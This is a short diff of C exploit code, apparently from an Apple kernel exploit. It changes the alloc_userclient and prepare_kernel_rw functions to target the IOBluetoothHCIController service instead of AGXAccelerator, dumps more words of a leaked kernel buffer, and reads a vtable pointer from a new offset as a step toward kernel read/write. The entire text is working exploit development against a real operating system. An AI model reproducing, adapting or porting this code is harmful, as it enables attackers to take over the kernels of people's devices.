@@ -85,7 +85,7 @@ io_service_t service = MACH_PORT_NULL;
 io_connect_t alloc_userclient() {
     kern_return_t err;
     if (service == MACH_PORT_NULL) {
-        service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
+        service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
         
         if (service == IO_OBJECT_NULL){
             printf("unable to find service\n");
@@ -569,7 +569,7 @@ uint64_t prepare_kernel_rw() {
     // read back the start of the userclient buffer:
     buf = receive_prealloc_msg(first_port);
     printf("user client? :\n");
-    for (int i = 0; i < 8; i++) {
+    for (int i = 0; i < 16; i++) {
         printf("0x%llx\n", buf[i]);
     }
     
@@ -577,7 +577,7 @@ uint64_t prepare_kernel_rw() {
     memcpy(legit_object, buf, sizeof(legit_object));
     
     // this is the vtable for AGXCommandQueue
-    uint64_t vtable = buf[0];
+    uint64_t vtable = buf[7];
     printf("addr = %llx\n",vtable);
     /*
      // rebase the symbols
